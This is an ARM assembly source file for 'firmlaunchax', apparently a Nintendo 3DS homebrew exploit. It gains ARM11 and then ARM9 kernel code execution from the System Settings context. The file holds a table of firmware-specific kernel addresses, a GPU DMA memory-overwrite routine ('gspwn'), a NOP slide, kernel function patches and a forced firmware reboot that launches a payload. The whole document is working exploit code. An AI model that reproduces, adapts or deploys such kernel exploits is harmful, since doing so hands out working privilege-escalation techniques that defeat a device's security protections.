@-----------------------------------------------@
@   firmlaunchax - arm9 kernel code execution   @
@       on mset (system settings) exploit.      @
@             FOR 4.X CONSOLES ONLY             @
@   -Roxas75                                    @
@-----------------------------------------------@

.arm

@-------------------------- GLOBALS ------------------------------
.equ top_fb1,                                   0x14184E60
.equ top_fb2,                                   0x141CB370
.equ gsp_addr,                                  0x14000000
.equ gsp_handle,                                0x0015801D
.equ gsp_code_addr,                             0x00100000
.equ fcram_code_addr,                           0x03E6D000
.equ gpuhandle,                                 0x0027c5D8
.equ payload_addr,                              0x00140000
.equ filehandle,                                0x00279000

@------------------------- FUNCTIONS -----------------------------
.equ memcpy,                                    0x001BFA60
.equ GSPGPU_FlushDataCache,                     0x001346C4
.equ GX_SetTextureCopy,                         0x0013C284
.equ nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue, 0x001AC924
.equ svcSleepThread,                            0x001AEA50
.equ svcControlMemory,                          0x001C3E24
.equ ifile_open,                                0x001B82A8
.equ ifile_write,                               0x001B3B50
.equ ifile_read,                                0x001B3954

@---------------------- SPECIFIC COSTANTS ------------------------
.equ costants,                                  0x2A0000
.equ kernel_patch_addr,                         0x2A0000
.equ fcram_address,                             0x2A0004
.equ jump_table_addr,                           0x2A0008
.equ func_patch,                                0x2A000C
.equ funct_to_call,                             0x2A0010
.equ reboot_func,                               0x2A0014
.equ jumptable_physical,                        0x2A0018
.equ func_patch_return_loc,                     0x2A001C
.equ pdn_regs,                                  0x2A0020
.equ pxi_regs,                                  0x2A0024

.equ load_offset,				0x240000
.equ arm9_code_size,				arm9_code_end-arm9_code
.equ jump_table_size,				jump_table_end-jump_table
jump_table_specific_addresses:
@ Explanation: the code after the jumptable which does firmlaunchax
@ itself, does not like variables. So we actually assume to not
@ change it anymore and replace here the firm-specific addresses.
@ These are just the variables offsets in arm9hax.bin
jt_func_patch_return_loc:  .word 0x000000CC
jt_pdn_regs:               .word 0x000000C4
jt_pxi_regs:               .word 0x000001D8

@----------------------------- CODE ------------------------------
.align 2
_start:
    secure_begin:
        nop
        nop
		
	read_firm_version:
		ldr r0, =0x1ff80000
		ldr r0, [r0]
	@ 2.34-0 4.1.0
		ldr r1, =0x02220000		
		cmp r0, r1
		ldreq r1, =firm_data1+load_offset
		beq copy_firm_data
	@ 2.35-6 5.0.0
		ldr r1, =0x02230600
		cmp r0, r1
		ldreq r1, =firm_data2+load_offset
		beq copy_firm_data
	@ 2.36-0 5.1.0
		ldr r1, =0x02240000
		cmp r0, r1
		ldreq r1, =firm_data3+load_offset
		beq copy_firm_data	
	@ 2.37-0 6.0.0 
		ldr r1, =0x02250000
		cmp r0, r1
		ldreq r1, =firm_data4+load_offset
		beq copy_firm_data
	@ 2.38-0 6.1.0
		ldr r1, =0x02260000
		cmp r0, r1
		ldreq r1, =firm_data4+load_offset
		beq copy_firm_data
	@ 2.39-4 7.0.0
		ldr r1, =0x02270400
		cmp r0, r1
		ldreq r1, =firm_data5+load_offset
		beq copy_firm_data
	@ 2.40-0 7.2.0
		ldr r1, =0x02280000
		cmp r0, r1
		ldreq r1, =firm_data6+load_offset
		beq copy_firm_data
	@ 2.44-6 8.0.0
		ldr r1, =0x022C0600
		cmp r0, r1
		ldreq r1, =firm_data7+load_offset
		beq copy_firm_data
	@ 2.26-0 9.0.0
		ldr r1, =0x022E0000
		cmp r0, r1
		ldreq r1, =firm_data8+load_offset
		beq copy_firm_data
	
	copy_firm_data:
        ldr r0, =costants
		ldr r2, =0x28
		ldr lr, =memcpy
		blx lr
		
	clear_filehandle:
        ldr r0, =filehandle
        ldr r1, =filehandle+0x20
        ldr r2, =0x0
        clfloop1:
            str r2, [r0]
            add r0, r0, #4
            cmp r0, r1
            blt clfloop1

    open_file:
        ldr r0, =filehandle
        ldr r1, =rxTools_dat+load_offset
        mov r2, #1
        ldr r4, =ifile_open
        blx r4

    read_data:
        ldr r0, =filehandle
        ldr r1, =filehandle+0x20
        ldr r2, =0x14400000
        ldr r3, =0x20000
        ldr r4, =ifile_read
        blx r4
        ldr r0, =filehandle
        ldr r1, =filehandle+0x20
        ldr r2, =0x14400000
        ldr r3, =0xE0000
        ldr r4, =ifile_read
        blx r4
		
    get_memchunk:
        mov r0, #1
        str r0, [sp]
        mov r0, #0
        str r0, [sp,#4]
        ldr r0, =0xFFFFFE0
        ldr r1, =0x14051000
        mov r2, #0
        mov r3, #0x1000
        ldr lr, =svcControlMemory
        blx lr

    patch_memchunck:
        ldr r1, =0x14002000
        mov r0, #1
        str r0, [r1]
        ldr r2, =kernel_patch_addr
        ldr r2, [r2]
        str r2, [r1,#4]
        mov r0, #0
        str r0, [r1,#8]
        str r0, [r1,#12]
        ldr r0, =0x14051000
        mov r1, #0x10
        mov r3, #4
        bl do_gspwn_copy

    restore_memchunk:
        mov r0, #1
        str r0, [sp]
        mov r0, #0
        str r0, [sp,#4]
        ldr r0, =0xFFFFFE0
        ldr r1, =0x14050000
        mov r2, #0
        mov r3, #0x1000
        ldr lr, =svcControlMemory
        blx lr

    generate_nop_slide:
        mov r10, #0x4000
        ldr r0, =0x14002000
        ldr r1, =0xE1A00000
        nop_gen_loop:
            str r1, [r0]
            add r0, #4
            subs r10, #1
            bne nop_gen_loop
        ldr r1, =0xE12FFF1E     @ bx lr
        str r1, [r0,#-4]

    copy_nop_slide:
        ldr r0, =gsp_addr+fcram_code_addr+0x4000
        mov r1, #0x10000
        ldr r2, =0xE1A00000
        mov r3, #0
        bl do_gspwn_copy

    execute_nop_slide:
        ldr lr, =0x104000
        blx lr

    arm11_kernel_jump:
        ldr     R0, =arm11_kernel_entry+load_offset
        .word 0xEF000008        @ SVC     8
        b arm11_kernel_jump
.pool
.align 2
do_gspwn_copy:
        stmfd sp!, {r4,r5,r9-r11,lr}
        mov r4, r0
        mov r10, r1
        mov r11, r2
        mov r9, r3
        sub sp, #0x20

    gspwn_loop:
        ldr r0, =0x14001000
        ldr r1, =0x14001000
        mov r2, #0x10000
        ldr lr, =memcpy
        blx lr
        ldr r0, =0x14002000
        mov r1, r10
        ldr lr, =GSPGPU_FlushDataCache
        blx lr

        ldr r0, =0x14000000
        mov r1, #4
        str r1, [r0]
        ldr r1, =0x14002000
        str r1, [r0,#4]
        mov r1, r4
        str r1, [r0,#8]
        mov r1, r10
        str r1, [r0,#12]
        mov r1, #0xFFFFFFFF
        str r1, [r0,#16]
        str r1, [r0,#20]
        mov r1, #8
        str r1, [r0,#24]
        mov r1, #0
        str r1, [r0,#28]
        mov r1, r0
        ldr r0, =gpuhandle
        ldr lr, =nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
        blx lr

        ldr r0, =0x14001000
        mov r1, #0x10
        ldr lr, =GSPGPU_FlushDataCache
        blx lr

        ldr r0, =0x14000000
        mov r1, #4
        str r1, [r0]
        ldr r1, =0x14001000
        str r1, [r0,#8]
        mov r1, r4
        str r1, [r0,#4]
        mov r1, #0x40
        str r1, [r0,#12]
        mov r1, #0xFFFFFFFF
        str r1, [r0,#16]
        str r1, [r0,#20]
        mov r1, #8
        str r1, [r0,#24]
        mov r1, #0
        str r1, [r0,#28]
        mov r1, r0
        ldr r0, =gpuhandle
        ldr lr, =nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
        blx lr

        ldr r0, =0x14001000
        ldr r1, =0x14001000
        mov r2, #0x10000
        ldr lr, =memcpy
        blx lr
        ldr r0, =0x14001000
        ldr r0, [r0,r9]
        cmp r0, r11
        bne gspwn_loop
        add sp, #0x20
        ldmfd sp!, {r4,r5,r9-r11,lr}
        bx lr
.pool

@---------------------------- SPECIFIC FIRM DATA ------------------------
firm_data1:							@ 2.34-0 4.1.0
	.word 0xEFF83C97
	.word 0xF0000000
	.word 0xEFFF4C80
	.word 0xEFFE4DD4
	.word 0xFFF748C4
	.word 0xEFFF497C
	.word 0x1FFF4C80
	.word 0xFFF84DDC
	.word 0xFFFD0000
	.word 0xFFFD2000
firm_data2:							@ 2.35-6 5.0.0
	.word 0xEFF8372F
	.word 0xF0000000
	.word 0xEFFF4C80
	.word 0xEFFE55BC
	.word 0xFFF64B94
	.word 0xEFFF4978
	.word 0x1FFF4C80
	.word 0xFFF765C4
	.word 0xFFFD0000
	.word 0xFFFD2000
firm_data3:							@ 2.36-0 5.1.0
	.word 0xEFF8372B
	.word 0xF0000000
	.word 0xEFFF4C80
	.word 0xEFFE55B8
	.word 0xFFF64B90
	.word 0xEFFF4978
	.word 0x1FFF4C80
	.word 0xFFF765C0
	.word 0xFFFD0000
	.word 0xFFFD2000	
firm_data4:							@ 2.37-0 6.0.0 | 2.38-0 6.1.0
	.word 0xEFF8372B
	.word 0xF0000000
	.word 0xEFFF4C80
	.word 0xEFFE5AE8
	.word 0xFFF64A78
	.word 0xEFFF4978
	.word 0x1FFF4C80
	.word 0xFFF76AF0
	.word 0xFFFD0000
	.word 0xFFFD2000
firm_data5:							@ 2.39-4 7.0.0
	.word 0xEFF8372F
	.word 0xF0000000
	.word 0xEFFF4C80
	.word 0xEFFE5B34
	.word 0xFFF64AB0
	.word 0xEFFF4978
	.word 0x1FFF4C80
	.word 0xFFF76B3C
	.word 0xFFFD0000
	.word 0xFFFD2000
firm_data6:							@ 2.40-0 7.2.0
	.word 0xEFF8372B
	.word 0xF0000000
	.word 0xEFFF4C80
	.word 0xEFFE5B30
	.word 0xFFF54BAC
	.word 0xEFFF4974
	.word 0x1FFF4C80
	.word 0xFFF76B38
	.word 0xFFFD0000
	.word 0xFFFD2000
firm_data7:							@ 2.44-6 8.0.0
	.word 0xDFF83767
	.word 0xE0000000
	.word 0xDFFF4C80
	.word 0xDFFE4F28
	.word 0xFFF54BAC
	.word 0xDFFF4974
	.word 0x1FFF4C80
	.word 0xFFF66F30
	.word 0xFFFBE000
	.word 0xFFFC0000
firm_data8:							@ 2.26-0 9.0.0
	.word 0xDFF83837
	.word 0xE0000000
	.word 0xDFFF4C80
	.word 0xDFFE59D0
	.word 0xFFF151C0
	.word 0xDFFF4974
	.word 0x1FFF4C80
	.word 0xFFF279D8
	.word 0xFFFC2000
	.word 0xFFFC4000

@---------------------- ARM11 KERNEL CODE ----------------------
.align 2
arm11_kernel_entry:
    arm11_start:
        .word 0xF57FF01F    @ clrex
        bl invalidate_dcache
        bl invalidate_icache
		
    copy_arm9:
        ldr r0, =arm9_code+load_offset
        ldr r1, =arm9_code_size
        add r1, r0
        ldr r2, =fcram_address
        ldr r2, [r2]
        ldr r3, =0x2F00000
        add r2, r3
        memcpy_arm9_code:
            ldmia r0!, {r3}
            stmia r2!, {r3}
            cmp r0, r1
            bcc memcpy_arm9_code

    copy_jumptable:
        ldr r0, =jump_table+load_offset
        ldr r1, =jump_table_size
        add r1, r0
        ldr r2, =jump_table_addr
        ldr r2, [r2]
        memcpy_arm11_hook:
            ldmia r0!, {r3}
            stmia r2!, {r3}
            cmp r0, r1
            bcc memcpy_arm11_hook

    change_jumptable_vars:
        ldr r0, =jump_table_addr
        ldr r0, [r0]
        ldr r1, =jt_func_patch_return_loc+load_offset
        ldr r1, [r1]
        add r1, r0
        ldr r2, =func_patch_return_loc
        ldr r2, [r2]
        str r2, [r1]
        ldr r1, =jt_pdn_regs+load_offset
        ldr r1, [r1]
        add r1, r0
        ldr r2, =pdn_regs
        ldr r2, [r2]
        str r2, [r1]
        ldr r1, =jt_pxi_regs+load_offset
        ldr r1, [r1]
        add r1, r0
        ldr r2, =pxi_regs
        ldr r2, [r2]
        str r2, [r1]


    patch_arm11_functions:
        ldr r0, =func_patch
        ldr r0, [r0]
        ldr r1, =0xE51FF004
        str r1, [r0]
        ldr r1, =0xFFFF0C80
        str r1, [r0,#4]
        ldr r0, =reboot_func
        ldr r0, [r0]
        ldr r1, =0xE51FF004
        str r1, [r0]
        ldr r1, =0x1FFF4C80+4
        str r1, [r0,#4]
        bl invalidate_dcache

    trigger_reboot:
        mov r0, #0
        mov r1, #0
        mov r2, #2
        mov r3, #0
        ldr lr, =funct_to_call
        ldr lr, [lr]
        bx lr
.pool

invalidate_dcache:
    mov r0, #0
    mcr p15, 0, r0,c7,c14, 0
    mcr p15, 0, r0,c7,c10, 4
    bx lr

invalidate_icache:
    mov r0, #0
    mcr p15, 0, r0,c7,c5, 0
    mcr p15, 0, r0,c7,c5, 4
    mcr p15, 0, r0,c7,c5, 6
    mcr p15, 0, r0,c7,c10, 4
    bx lr

@---------------------------- ARM11 JUMPTABLE --------------------------
.align 2
    jump_table:
    .incbin "build/arm9hax.bin"
    jump_table_end:

@------------------------------- ARM9 CODE ------------------------------
.align 2
 arm9_code:
    .incbin "build/arm9_code.bin"
 arm9_code_end:

 .align 2
rxTools_dat:
    .string16 "YS:/rxTools.dat"
    .word 0

.pool
